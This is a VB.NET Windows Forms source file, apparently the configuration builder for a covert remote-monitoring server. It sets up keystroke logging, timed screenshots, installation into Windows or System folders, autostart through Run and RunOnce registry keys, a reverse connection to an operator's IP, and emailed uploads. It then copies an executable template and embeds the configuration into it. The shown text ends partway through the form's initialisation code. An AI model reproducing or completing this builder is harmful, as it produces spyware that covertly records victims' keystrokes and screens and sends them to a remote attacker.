
Imports WinMonitorBLIB_1_0
Imports System.Windows.Forms

Public Class frmWinMonitorServerConfig : Inherits System.Windows.Forms.Form

#Region "Member Variable Constants"

    Private Const TEXT_COUNT As Integer = 10
   Public Enum TEXT_IDS As Integer
      ID_KEYLOGGER_FILENAME = 0
      ID_SCREENMONITOR_DIRNAME = 1
      ID_IP = 2
      ID_EXE_SETUP_SAVEDIR = 3
      ID_EXE_FILE_NAME = 4
      ID_EXE_INTERNAL_NAME = 5

      ID_EXE_REGISTRYNAME = 6
      ID_EXE_TARGET_HOSTNAME = 7
        ID_EMAIL = 8
        ID_EMAIL_SERVER = 9
        ID_DOMAIN = 10
   End Enum

   Private Enum LENGTH_IDS As Integer
      ID_KEYLOGGER_FILESIZE = 0
      ID_TIMEINTERVAL = 1
      ID_BITMAPCNT = 2
   End Enum

   Private Const PORT_COUNT As Integer = 2
   Private Enum PORT_IDS As Integer
      ID_LISTEN_PORT = 0
      ID_REVERSE_PORT = 1
   End Enum


#End Region

#Region "Member Variables"

   Private m_intCurrentTextBox As Integer = TEXT_IDS.ID_KEYLOGGER_FILENAME
   Private m_boolTextChanged(TEXT_COUNT) As Boolean
   Private m_intCurrentNumeralTextBox As Integer = LENGTH_IDS.ID_KEYLOGGER_FILESIZE
   Private m_intPortBoxes As Integer = PORT_IDS.ID_LISTEN_PORT
   Private m_boolPortNotChanged(PORT_COUNT) As Boolean
   Private m_objStringUtility As New CStringUtility()
    Private m_frmWinMonitorNameAdvanced As New FrmWinMonitorServerConfigurationsAdvanced()
    Private m_DefaultXML As String
    Private m_ServerTemplate As String
    Private m_ServerDllTemplate As String

#End Region

#Region "Member Properties"

    Public WriteOnly Property CurrentTextBox() As Integer
        Set(ByVal Value As Integer)
            m_intCurrentTextBox = Value
        End Set
    End Property

    Public WriteOnly Property DefaultXML() As String
        Set(ByVal Value As String)
            m_DefaultXML = Value
        End Set
    End Property

    Public WriteOnly Property ServerTemplate() As String
        Set(ByVal Value As String)
            m_ServerTemplate = Value
        End Set
    End Property

    Public WriteOnly Property ServerDLLTemplate() As String
        Set(ByVal Value As String)
            m_ServerDllTemplate = Value
        End Set
    End Property


#End Region

#Region "Member Functions"

    Private Function INIWriter() As Boolean
        Dim objStrUty As New CStringUtility()
        Dim objExeEditor As New CExeEditor()
        Dim strTargetFileName As String = txtWinMonitorSaveDir.Text & IIf(txtWinMonitorSaveDir.Text.EndsWith(IDS_FILE_SLASH) = True, "", IDS_FILE_SLASH) _
                                          & "WinMonitorServer.Config.INI"

        Try
            Dim RootName As String
            Dim strAttributeVal As String
            Dim strFilename As String
            Dim strDllFilename As String = "WinMonitorServerPlugin.dll"

            Dim oStream As System.IO.FileStream = System.IO.File.Create(strTargetFileName)

            If (oStream Is Nothing) Then
                Throw New Exception("Cannot create " & strTargetFileName)
            End If
            oStream.Close()

            If Not (m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text.Trim.ToUpper.EndsWith(".EXE")) Then
                m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text = m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text.Trim & ".exe"
            End If

            m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text = m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text.Trim()
            While (m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text.StartsWith("\"))
                m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text = m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text.Substring(1)
            End While

            Dim intFileNameIndx As Integer = m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text.LastIndexOf(IDS_FILE_SLASH)
            If intFileNameIndx = -1 Then
                strFilename = m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text
            Else
                strFilename = m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text.Substring(intFileNameIndx + 1)
            End If

            With objStrUty
                .WritePrivateProfileString("WIN_MONITOR_SERVER", "DATE", Format(Now(), "dd-MMM-yyyy"), strTargetFileName)
                .WritePrivateProfileString("WIN_MONITOR_SERVER", "TIME", Format(Now(), "HH:mm:ss:ff tt"), strTargetFileName)

                .WritePrivateProfileString("WIN_MONITOR_SERVER", "INCLUDE-CONFIG-FILE", IIf(m_frmWinMonitorNameAdvanced.rdobtnWinMonitorAdvancedOptionsIncludeConfigFile.Checked = 1 _
                   , "TRUE", "FALSE"), strTargetFileName)
                .WritePrivateProfileString("WIN_MONITOR_SERVER", "FILE-NAME", m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text, strTargetFileName)
                .WritePrivateProfileString("WIN_MONITOR_SERVER", "INTERNAL-NAME", txtWinMonitorInternalName.Text, strTargetFileName)
                With m_frmWinMonitorNameAdvanced
                    Select Case True
                        Case .rdobtnWinMonitorAdvancedOptionsInstallLocationWindows.Checked
                            strAttributeVal = "WINDOWS"
                        Case .rdobtnWinMonitorAdvancedOptionsInstallLocationSystem.Checked()
                            strAttributeVal = "SYSTEM"
                        Case .rdobtnWinMonitorAdvancedOptionsInstallLocationProgramFiles.Checked
                            strAttributeVal = "PROGRAM FILES"
                        Case .rdobtnWinMonitorAdvancedOptionsInstallLocationCommonFiles.Checked
                            strAttributeVal = "COMMON FILES"
                    End Select
                End With
                .WritePrivateProfileString("WIN_MONITOR_SERVER", "INSTALL-LOCATION", strAttributeVal, strTargetFileName)

                .WritePrivateProfileString("REGISTRY-SETTINGS", "REGISTRY-KEY", txtWinMonitorRegKeyName.Text, strTargetFileName)
                .WritePrivateProfileString("REGISTRY-SETTINGS", "LOCAL-USER_RUN-ALWAYS", IIf(rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways.Checked = True, "T", "F"), strTargetFileName)
                .WritePrivateProfileString("REGISTRY-SETTINGS", "LOCAL-MACHINE_RUN-ALWAYS", IIf(rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunAlways.Checked = True, "T", "F"), strTargetFileName)
                .WritePrivateProfileString("REGISTRY-SETTINGS", "LOCAL-MACHINE_RUN-ONCE", IIf(rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunOnce.Checked = True, "T", "F"), strTargetFileName)

                .WritePrivateProfileString("KEY-MONITOR", "INCLUDE-DATE", IIf(chkboxKeyMonitorDateOption.Checked = True, "T", "F"), strTargetFileName)
                .WritePrivateProfileString("KEY-MONITOR", "INCLUDE-TIME", IIf(chkboxKeyMonitorTimeOption.Checked = True, "T", "F"), strTargetFileName)
                .WritePrivateProfileString("KEY-MONITOR", "INCLUDE-USER", IIf(chkboxKeyMonitorUserNameOption.Checked = True, "T", "F"), strTargetFileName)
                .WritePrivateProfileString("KEY-MONITOR", "UPLOAD-SIZE", txtFileUploadSize.Text, strTargetFileName)
                Select Case True
                    Case rdobtnKeyMonitorRootDirWindows.Checked
                        strAttributeVal = "WINDOWS"
                    Case rdobtnKeyMonitorRootDirSystem.Checked
                        strAttributeVal = "SYSTEM"
                    Case rdobtnKeyMonitorRootDirProgramFiles.Checked()
                        strAttributeVal = "PROGRAM FILES"
                    Case rdobtnKeyMonitorRootDirCommonFiles.Checked
                        strAttributeVal = "COMMON FILES"
                End Select
                .WritePrivateProfileString("KEY-MONITOR", "ROOT-DIRECTORY", strAttributeVal, strTargetFileName)
                strAttributeVal = txtLogFileName.Text
                Select Case True
                    Case rdobtnKeyMonitorFileExtnDAT.Checked
                        strAttributeVal &= ".DAT"
                    Case rdobtnKeyMonitorFileExtnFILE.Checked
                        strAttributeVal &= ".FILE"
                    Case rdobtnKeyMonitorFileExtnTXT.Checked()
                        strAttributeVal &= ".TXT"
                End Select
                .WritePrivateProfileString("KEY-MONITOR", "LOG-FILE-NAME", strAttributeVal, strTargetFileName)

                Dim strElapsingTime As String
                Select Case True
                    Case rdobtnScreenMonitorIntervalsSeconds.Checked
                        strAttributeVal = "SECOND"
                        strElapsingTime = txtScreenMonitorIntervalsSeconds.Text
                    Case rdobtnScreenMonitorIntervalsMinitues.Checked
                        strAttributeVal = "MINITUE"
                        strElapsingTime = txtScreenMonitorIntervalsMinitues.Text
                    Case rdobtnScreenMonitorIntervalsHours.Checked
                        strAttributeVal = "HOUR"
                        strElapsingTime = txtScreenMonitorIntervalsHours.Text
                End Select
                .WritePrivateProfileString("SCREEN-MONITOR", "TIME-INTERVAL", strAttributeVal, strTargetFileName)
                .WritePrivateProfileString("SCREEN-MONITOR", "FILE-LIMIT", txtPictureLmt.Text, strTargetFileName)
                Select Case True
                    Case rdobtnScreenMonitorRootDirWindows.Checked
                        strAttributeVal = "WINDOWS"
                    Case rdobtnScreenMonitorRootDirSystem.Checked
                        strAttributeVal = "SYSTEM"
                    Case rdobtnScreenMonitorRootDirProgramFiles.Checked
                        strAttributeVal = "PROGRAM FILES"
                    Case rdobtnScreenMonitorRootDirCommonFiles.Checked
                        strAttributeVal = "COMMON FILES"
                End Select
                .WritePrivateProfileString("SCREEN-MONITOR", "ROOT-DIRECTORY", strAttributeVal, strTargetFileName)
                .WritePrivateProfileString("SCREEN-MONITOR", "PICTURE-DIRECTORY", txtScreenMonitorDirName.Text, strTargetFileName)
                .WritePrivateProfileString("SCREEN-MONITOR", "ELAPSING-TIME", strElapsingTime, strTargetFileName)

                .WritePrivateProfileString("NETWORK-MONITOR", "REVERSE-CONNECT", IIf(rdobtnReverseConnectionEnable.Checked = False, "F", "T"), strTargetFileName)
                If (rdobtnReverseConnectionEnable.Checked = True) Then
                    .WritePrivateProfileString("REVERSE-CONNECTION", "IP", txtNwMonitorReverseConnectionIP.Text, strTargetFileName)
                    .WritePrivateProfileString("REVERSE-CONNECTION", "PORT", txtNwMonitorReverseConnectionPort.Text, strTargetFileName)
                    .WritePrivateProfileString("REVERSE-CONNECTION", "ATTEMPT-INTERVAL", txtNwMonitorReverseConnectionAttempt.Text, strTargetFileName)
                End If
                .WritePrivateProfileString("NETWORK-MONITOR", "HOST", txtWinMonitorTargetedHostName.Text, strTargetFileName)
                .WritePrivateProfileString("NETWORK-MONITOR", "PORT", txtNwMonitorListenPort.Text, strTargetFileName)
                .WritePrivateProfileString("NETWORK-MONITOR", "PASSWORD", txtNwMonitorPassword.Text, strTargetFileName)
                If (chkboxNwMonitorEmail.Checked = True) Then
                    .WritePrivateProfileString("NETWORK-MONITOR", "EMAIL", "T", strTargetFileName)
                    .WritePrivateProfileString("NETWORK-MONITOR", "EMAIL_ID", txtNwMonitorEmail.Text, strTargetFileName)
                    .WritePrivateProfileString("NETWORK-MONITOR", "EMAIL_SERVER", txtNwMonitorEmailServer.Text, strTargetFileName)
                Else
                    .WritePrivateProfileString("NETWORK-MONITOR", "EMAIL", "F", strTargetFileName)
                End If

                System.IO.File.Copy(m_ServerTemplate, txtWinMonitorSaveDir.Text & IDS_FILE_SLASH & strFilename, True)
                System.IO.File.Copy(m_ServerDllTemplate, txtWinMonitorSaveDir.Text & IDS_FILE_SLASH & strDllFilename, True)

                If (m_frmWinMonitorNameAdvanced.rdobtnWinMonitorAdvancedOptionsIncludeConfigFile.Checked = True) Then
                    If (objExeEditor.SetExeFileName(txtWinMonitorSaveDir.Text & IDS_FILE_SLASH & strFilename) = False) Then
                        Throw New Exception("Cannot initialize EXE editor...")
                    End If
                    If (objExeEditor.SetResourceInfo("WinMonitorConfig", "WinMonitorConfigINI") = False) Then
                        Throw New Exception("Cannot edit exe template...")
                    End If
                    If (objExeEditor.EmbedFileToexe(strTargetFileName) = False) Then
                        Throw New Exception("Cannot edit exe template...")
                    End If
                End If

            End With
        Catch eX As Exception
            m_objStringUtility.MsgErr(eX.ToString, IDS_XML_EDITING_ERROR)
            Exit Function
        End Try
        objExeEditor = Nothing : objExeEditor = Nothing
    End Function

    Private Function XmlWriter() As Boolean
        Dim objXmlutility As New CXmlUtility()
        Dim objBaseXmlUtility As New CXmlUtility()

        Try
            Dim strTargetFileName As String = txtWinMonitorSaveDir.Text & IIf(txtWinMonitorSaveDir.Text.EndsWith(IDS_FILE_SLASH) = True, "", IDS_FILE_SLASH) _
                                              & "WinMonitorServer.1.0.xml"
            Dim RootName As String
            Dim strAttributeVal As String
            If Not (m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text.Trim.ToUpper.EndsWith(".EXE")) Then
                m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text = m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text.Trim & ".exe"
            End If

            With objXmlutility
                .CreateNewXmlDocument(strTargetFileName, "WinMonitorServer")
                RootName = "WinMonitorServer"
                .SetForceCreate(True)
                .SetNodeTextIntoHeirarchy(RootName, "WIN-MONITOR-SERVER", "", 1)
                .SetNodeAttributeIntoHeirarchy(RootName, "Date", Format(Now(), "dd-MMM-yyyy"), 1)
                .SetNodeAttributeIntoHeirarchy(RootName, "Time", Format(Now(), "hh:mm:ss"), 1)

                .MoveToChildByName(RootName, "WIN-MONITOR-SERVER", 1)

                .SetNodeAttributeIntoHeirarchy("WIN-MONITOR-SERVER", "INCLUDE-CONFIG-FILE", _
                   IIf(m_frmWinMonitorNameAdvanced.rdobtnWinMonitorAdvancedOptionsIncludeConfigFile.Checked = 1 _
                   , "TRUE", "FALSE"), 0)
                .SetNodeTextIntoHeirarchy("WIN-MONITOR-SERVER", "FILE-NAME", m_frmWinMonitorNameAdvanced.txtWinMonitorFileName.Text, 0)
                .SetNodeTextIntoHeirarchy("WIN-MONITOR-SERVER", "INTERNAL-NAME", txtWinMonitorInternalName.Text, 0)
                With m_frmWinMonitorNameAdvanced
                    Select Case True
                        Case .rdobtnWinMonitorAdvancedOptionsInstallLocationWindows.Checked
                            strAttributeVal = "WINDOWS"
                        Case .rdobtnWinMonitorAdvancedOptionsInstallLocationSystem.Checked()
                            strAttributeVal = "SYSTEM"
                        Case .rdobtnWinMonitorAdvancedOptionsInstallLocationProgramFiles.Checked
                            strAttributeVal = "PROGRAM FILES"
                        Case .rdobtnWinMonitorAdvancedOptionsInstallLocationCommonFiles.Checked
                            strAttributeVal = "COMMON FILES"
                    End Select
                End With
                .SetNodeTextIntoHeirarchy("WIN-MONITOR-SERVER", "INSTALL-LOCATION", strAttributeVal, 0)
                .SetNodeTextIntoHeirarchy("WIN-MONITOR-SERVER/REGISTRY-SETTINGS", "REGISTRY-KEY", txtWinMonitorRegKeyName.Text, 0)
                .MoveToChildByName("WIN-MONITOR-SERVER/REGISTRY-SETTINGS", "REGISTRY-KEY", 0)
                .SetNodeAttributeIntoHeirarchy("LOCAL-USER", "RUN-ALWAYS", IIf(rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways.Checked = True, "TRUE", "FALSE"), 0)
                .SetNodeAttributeIntoHeirarchy("LOCAL-MACHINE", "RUN-ALWAYS", IIf(rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunAlways.Checked = True, "TRUE", "FALSE"), 0)
                .SetNodeAttributeIntoHeirarchy("LOCAL-MACHINE", "RUN-ONCE", IIf(rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunOnce.Checked = True, "TRUE", "FALSE"), 0)
                .SetNodeAttributeIntoHeirarchy(RootName & "/KEY-MONITOR", "INCLUDE-DATE", IIf(chkboxKeyMonitorDateOption.Checked = True, "TRUE", "FALSE"), 1)
                .MoveToChildByName(RootName, "KEY-MONITOR", 1)
                .SetNodeAttributeIntoHeirarchy("KEY-MONITOR", "INCLUDE-TIME", IIf(chkboxKeyMonitorTimeOption.Checked = True, "TRUE", "FALSE"), False)
                .SetNodeAttributeIntoHeirarchy("KEY-MONITOR", "INCLUDE-USER", IIf(chkboxKeyMonitorUserNameOption.Checked = True, "TRUE", "FALSE"), 0)
                .SetNodeAttributeIntoHeirarchy("KEY-MONITOR", "UPLOAD-SIZE", txtFileUploadSize.Text, 0)
                Select Case True
                    Case rdobtnKeyMonitorRootDirWindows.Checked
                        strAttributeVal = "WINDOWS"
                    Case rdobtnKeyMonitorRootDirSystem.Checked
                        strAttributeVal = "SYSTEM"
                    Case rdobtnKeyMonitorRootDirProgramFiles.Checked()
                        strAttributeVal = "PROGRAM FILES"
                    Case rdobtnKeyMonitorRootDirCommonFiles.Checked
                        strAttributeVal = "COMMON FILES"
                End Select
                .SetNodeTextIntoHeirarchy("KEY-MONITOR", "ROOT-DIRECTORY", strAttributeVal, 0)
                strAttributeVal = txtLogFileName.Text
                Select Case True
                    Case rdobtnKeyMonitorFileExtnDAT.Checked
                        strAttributeVal &= ".DAT"
                    Case rdobtnKeyMonitorFileExtnFILE.Checked
                        strAttributeVal &= ".FILE"
                    Case rdobtnKeyMonitorFileExtnTXT.Checked()
                        strAttributeVal &= ".TXT"
                End Select
                .SetNodeTextIntoHeirarchy("KEY-MONITOR", "LOG-FILE-NAME", strAttributeVal, 0)

                Dim strElapsingTime As String
                Select Case True
                    Case rdobtnScreenMonitorIntervalsSeconds.Checked
                        strAttributeVal = "SECOND"
                        strElapsingTime = txtScreenMonitorIntervalsSeconds.Text
                    Case rdobtnScreenMonitorIntervalsMinitues.Checked
                        strAttributeVal = "MINITUE"
                        strElapsingTime = txtScreenMonitorIntervalsMinitues.Text
                    Case rdobtnScreenMonitorIntervalsHours.Checked
                        strAttributeVal = "HOUR"
                        strElapsingTime = txtScreenMonitorIntervalsHours.Text
                End Select
                .SetNodeAttributeIntoHeirarchy(RootName & "/SCREEN-MONITOR", "TIME-INTERVAL", strAttributeVal, 1)
                .MoveToChildByName(RootName, "SCREEN-MONITOR", 1)
                .SetNodeAttributeIntoHeirarchy("SCREEN-MONITOR", "FILE-LIMIT", txtPictureLmt.Text, 0)
                Select Case True
                    Case rdobtnScreenMonitorRootDirWindows.Checked
                        strAttributeVal = "WINDOWS"
                    Case rdobtnScreenMonitorRootDirSystem.Checked
                        strAttributeVal = "SYSTEM"
                    Case rdobtnScreenMonitorRootDirProgramFiles.Checked()
                        strAttributeVal = "PROGRAM FILES"
                    Case rdobtnScreenMonitorRootDirCommonFiles.Checked
                        strAttributeVal = "COMMON FILES"
                End Select
                .SetNodeTextIntoHeirarchy("SCREEN-MONITOR", "ROOT-DIRECTORY", strAttributeVal, 0)
                .SetNodeTextIntoHeirarchy("SCREEN-MONITOR", "PICTURE-DIRECTORY", txtScreenMonitorDirName.Text, 0)
                .SetNodeTextIntoHeirarchy("SCREEN-MONITOR", "ELAPSING-TIME", strElapsingTime, 0)

                .SetNodeAttributeIntoHeirarchy(RootName & "/NETWORK-MONITOR", "REVERSE-CONNECT", _
                IIf(rdobtnReverseConnectionEnable.Checked = False, "FALSE", "TRUE"), 1)
                .MoveToChildByName(RootName, "NETWORK-MONITOR", 1)
                If (rdobtnReverseConnectionEnable.Checked = True) Then
                    .SetNodeTextIntoHeirarchy("NETWORK-MONITOR/REVERSE-CONNECTION", "IP", txtNwMonitorReverseConnectionIP.Text, False)
                    .MoveToChildByName("NETWORK-MONITOR", "REVERSE-CONNECTION", 0)
                    .SetNodeTextIntoHeirarchy("REVERSE-CONNECTION", "PORT", txtNwMonitorReverseConnectionPort.Text, 0)
                    .SetNodeTextIntoHeirarchy("REVERSE-CONNECTION", "ATTEMPT-INTERVAL", txtNwMonitorReverseConnectionAttempt.Text, 0)
                End If
                .MoveToChildByName(RootName, "NETWORK-MONITOR", 1)
                .SetNodeTextIntoHeirarchy("NETWORK-MONITOR/CONNECTION", "HOST", txtWinMonitorTargetedHostName.Text, 0)
                .SetNodeTextIntoHeirarchy("NETWORK-MONITOR/CONNECTION", "PORT", txtNwMonitorListenPort.Text, 0)
                .SetNodeTextIntoHeirarchy("NETWORK-MONITOR/CONNECTION", "PASSWORD", txtNwMonitorPassword.Text, 0)
                If (chkboxNwMonitorEmail.Checked = True) Then
                    .SetNodeTextIntoHeirarchy("NETWORK-MONITOR/CONNECTION", "EMAIL", txtNwMonitorEmail.Text, 0)
                    .SetNodeTextIntoHeirarchy("NETWORK-MONITOR/CONNECTION", "EMAIL_SERVER", txtNwMonitorEmailServer.Text, 0)
                    strAttributeVal = "TRUE"
                Else
                    strAttributeVal = "FALSE"
                End If
                .SetNodeAttributeIntoHeirarchy("NETWORK-MONITOR", "EMAIL", strAttributeVal, 0)
            End With

            If (objBaseXmlUtility.OpenXmlDocument(m_DefaultXML) = False) Then
                If (objBaseXmlUtility.CreateNewXmlDocument(m_DefaultXML, "WinMonitorServers") = False) Then
                    Throw New Exception("Cannot found/create xml document")
                End If
            End If
            If (objBaseXmlUtility.InsertAllNodesFrom(strTargetFileName, True) = False) Then
                Throw New Exception("Cannot update xml document")
            End If
            MessageBox.Show("WinMonitorServer Creation completed...", "Success...", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1)
            Me.Close()
        Catch ex As Exception
            m_objStringUtility.MsgErr(ex.ToString, IDS_XML_EDITING_ERROR)
            Exit Function
        End Try

        objBaseXmlUtility = Nothing : objXmlutility = Nothing

    End Function

#Region " Windows Form Designer generated code "

    Public Sub New()
        MyBase.New()

        'This call is required by the Windows Form Designer.
        InitializeComponent()

        'Add any initialization after the InitializeComponent() call

    End Sub

    'Form overrides dispose to clean up the component list.
    Protected Overloads Overrides Sub Dispose(ByVal disposing As Boolean)
        If disposing Then
            If Not (components Is Nothing) Then
                components.Dispose()
            End If
        End If
        MyBase.Dispose(disposing)
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    Friend WithEvents gbxScreenSnatcherOptions As System.Windows.Forms.GroupBox
    Friend WithEvents lblPictureLmt2 As System.Windows.Forms.Label
    Friend WithEvents lblPictureLmt1 As System.Windows.Forms.Label
    Friend WithEvents lblConst1 As System.Windows.Forms.Label
    Friend WithEvents tabpgeWinMonitorServerOptions As System.Windows.Forms.TabPage
    Friend WithEvents tabWinMonitorServerConfigurations As System.Windows.Forms.TabControl
    Friend WithEvents gbxWinMonitorOptions As System.Windows.Forms.GroupBox
    Friend WithEvents txtWinMonitorRegKeyName As System.Windows.Forms.TextBox
    Friend WithEvents lblWinMonitorRegKeyName As System.Windows.Forms.Label
    Friend WithEvents txtWinMonitorSaveDir As System.Windows.Forms.TextBox
    Friend WithEvents lblWinMonitorSaveDir As System.Windows.Forms.Label
    Friend WithEvents btnWinMonitorSaveDir As System.Windows.Forms.Button
    Friend WithEvents txtWinMonitorTargetedHostName As System.Windows.Forms.TextBox
    Friend WithEvents lblWinMonitorTargetedHostName As System.Windows.Forms.Label
    Friend WithEvents gbxWinMonitorRegisterLocations As System.Windows.Forms.GroupBox
    Friend WithEvents lblWinMonitorHKEY_LOCAL_MACHINE As System.Windows.Forms.Label
    Friend WithEvents lblWinMonitorHKEY_LOCAL_USER As System.Windows.Forms.Label
    Friend WithEvents line1 As System.Windows.Forms.Label
    Friend WithEvents line3 As System.Windows.Forms.Label
    Friend WithEvents gbxWinMonitorHKEY_LOCAL_MACHINE As System.Windows.Forms.GroupBox
    Friend WithEvents line4 As System.Windows.Forms.Label
    Friend WithEvents line5 As System.Windows.Forms.Label
    Friend WithEvents line6 As System.Windows.Forms.Label
    Friend WithEvents btnWinMonitorBuild As System.Windows.Forms.Button
    Friend WithEvents btnWinMonitorNameAdvancedOptions As System.Windows.Forms.Button
    Friend WithEvents lblFileUploadSize2 As System.Windows.Forms.Label
    Friend WithEvents txtFileUploadSize As System.Windows.Forms.TextBox
    Friend WithEvents lblFileUploadSize1 As System.Windows.Forms.Label
    Friend WithEvents txtLogFileName As System.Windows.Forms.TextBox
    Friend WithEvents lblLogFileName As System.Windows.Forms.Label
    Friend WithEvents line8 As System.Windows.Forms.Label
    Friend WithEvents gbxWinMonitorHKEY_LOCAL_USER As System.Windows.Forms.GroupBox
    Friend WithEvents btnWinMonitorServerConfigOk As System.Windows.Forms.Button
    Friend WithEvents btnWinMonitorServerConfigCancel As System.Windows.Forms.Button
    Friend WithEvents tabpgeKeyMonitorOptions As System.Windows.Forms.TabPage
    Friend WithEvents gbxKeyMonitorOptions As System.Windows.Forms.GroupBox
    Friend WithEvents gbxKeyMonitorRootDir As System.Windows.Forms.GroupBox
    Friend WithEvents rdobtnKeyMonitorRootDirProgramFiles As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnKeyMonitorRootDirCommonFiles As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnKeyMonitorRootDirSystem As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnKeyMonitorRootDirWindows As System.Windows.Forms.RadioButton
    Friend WithEvents gbxKeyMonitorOptionsAdditional As System.Windows.Forms.GroupBox
    Friend WithEvents gbxKeyMonitorFileExtn As System.Windows.Forms.GroupBox
    Friend WithEvents rdobtnKeyMonitorFileExtnFILE As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnKeyMonitorFileExtnTXT As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnKeyMonitorFileExtnDAT As System.Windows.Forms.RadioButton
    Friend WithEvents chkboxKeyMonitorUserNameOption As System.Windows.Forms.CheckBox
    Friend WithEvents chkboxKeyMonitorTimeOption As System.Windows.Forms.CheckBox
    Friend WithEvents chkboxKeyMonitorDateOption As System.Windows.Forms.CheckBox
    Friend WithEvents tabpgeScreenMonitorOptions As System.Windows.Forms.TabPage
    Friend WithEvents gbxScreenMonitorRootDir As System.Windows.Forms.GroupBox
    Friend WithEvents rdobtnScreenMonitorRootDirProgramFiles As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnScreenMonitorRootDirCommonFiles As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnScreenMonitorRootDirSystem As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnScreenMonitorRootDirWindows As System.Windows.Forms.RadioButton
    Friend WithEvents gbxScreenMonitorOptionsAdditional As System.Windows.Forms.GroupBox
    Friend WithEvents txtScreenMonitorIntervalsHours As System.Windows.Forms.TextBox
    Friend WithEvents txtScreenMonitorIntervalsMinitues As System.Windows.Forms.TextBox
    Friend WithEvents txtScreenMonitorIntervalsSeconds As System.Windows.Forms.TextBox
    Friend WithEvents rdobtnScreenMonitorIntervalsHours As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnScreenMonitorIntervalsMinitues As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnScreenMonitorIntervalsSeconds As System.Windows.Forms.RadioButton
    Friend WithEvents txtPictureLmt As System.Windows.Forms.TextBox
    Friend WithEvents txtScreenMonitorDirName As System.Windows.Forms.TextBox
    Friend WithEvents lblScreenMonitorDirName As System.Windows.Forms.Label
    Friend WithEvents tabpgeNetworkMonitorOptions As System.Windows.Forms.TabPage
    Friend WithEvents gbxNetworkMonitorOptions As System.Windows.Forms.GroupBox
    Friend WithEvents lblFileExtnIcon As System.Windows.Forms.Label
    Friend WithEvents pbxNwMonitorIcon As System.Windows.Forms.PictureBox
    Friend WithEvents gbxNwMonitorReverseConnection As System.Windows.Forms.GroupBox
    Friend WithEvents lblNwMonitorReverseConnectionAttempt2 As System.Windows.Forms.Label
    Friend WithEvents lblNwMonitorReverseConnectionPort2 As System.Windows.Forms.Label
    Friend WithEvents txtNwMonitorReverseConnectionIP As System.Windows.Forms.TextBox
    Friend WithEvents txtNwMonitorReverseConnectionAttempt As System.Windows.Forms.TextBox
    Friend WithEvents txtNwMonitorReverseConnectionPort As System.Windows.Forms.TextBox
    Friend WithEvents lblNwMonitorReverseConnectionAttempt1 As System.Windows.Forms.Label
    Friend WithEvents lblNwMonitorReverseConnectionPort1 As System.Windows.Forms.Label
    Friend WithEvents lblNwMonitorReverseConnectionIP As System.Windows.Forms.Label
    Friend WithEvents lblNwMonitorRePassword As System.Windows.Forms.Label
    Friend WithEvents txtNwMonitorRePassword As System.Windows.Forms.TextBox
    Friend WithEvents lblNwMonitorPassword As System.Windows.Forms.Label
    Friend WithEvents txtNwMonitorPassword As System.Windows.Forms.TextBox
    Friend WithEvents lblNwMonitorListenPort2 As System.Windows.Forms.Label
    Friend WithEvents txtNwMonitorListenPort As System.Windows.Forms.TextBox
    Friend WithEvents lblNwMonitorListenPort1 As System.Windows.Forms.Label
    Friend WithEvents txtWinMonitorInternalName As System.Windows.Forms.TextBox
    Friend WithEvents lblWinMonitorInternalName As System.Windows.Forms.Label
    Friend WithEvents rdobtnReverseConnectionEnable As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnReverseConnectionDisable As System.Windows.Forms.RadioButton
    Friend WithEvents txtNwMonitorEmail As System.Windows.Forms.TextBox
    Friend WithEvents lblNwMonitorEmail As System.Windows.Forms.Label
    Friend WithEvents chkboxNwMonitorEmail As System.Windows.Forms.CheckBox
    Friend WithEvents txtNwMonitorEmailServer As System.Windows.Forms.TextBox
    Friend WithEvents lblNwMonitorEmailServer As System.Windows.Forms.Label
    '<System.Diagnostics.DebuggerStepThrough()> 
    Friend WithEvents rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways As System.Windows.Forms.CheckBox
    Friend WithEvents rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunOnce As System.Windows.Forms.CheckBox
    Friend WithEvents rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunAlways As System.Windows.Forms.CheckBox
    Private Sub InitializeComponent()
        Dim resources As System.Resources.ResourceManager = New System.Resources.ResourceManager(GetType(frmWinMonitorServerConfig))
        Me.tabWinMonitorServerConfigurations = New System.Windows.Forms.TabControl()
        Me.tabpgeKeyMonitorOptions = New System.Windows.Forms.TabPage()
        Me.gbxKeyMonitorOptions = New System.Windows.Forms.GroupBox()
        Me.gbxKeyMonitorRootDir = New System.Windows.Forms.GroupBox()
        Me.rdobtnKeyMonitorRootDirProgramFiles = New System.Windows.Forms.RadioButton()
        Me.rdobtnKeyMonitorRootDirCommonFiles = New System.Windows.Forms.RadioButton()
